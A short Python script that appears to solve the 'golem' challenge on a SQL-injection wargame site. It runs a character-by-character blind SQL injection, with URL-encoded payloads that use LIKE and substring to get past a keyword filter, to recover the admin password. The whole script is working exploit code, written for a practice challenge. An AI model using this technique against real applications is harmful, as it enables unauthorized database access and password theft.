import urllib.request
import sys

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?"
cookie = sys.argv[1]
letter = "0123456789abcdefghijklmnopqrstuvwxyz"
pw = ''

for i in range(1, 9):
  for j in letter:
    query = "pw=%27||id%20like%20%27admin%27%20%26%26%20substring(pw,{},1)%20like%20%27{}%27%23".format(i,j)
    req = urllib.request.Request(
      url+query,
      data=None,
      headers={
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Cookie" : cookie
      })
    with urllib.request.urlopen(req) as res:
      body = res.read().decode()
    if 'Hello admin' in body:
      pw += j
      break
print(pw)
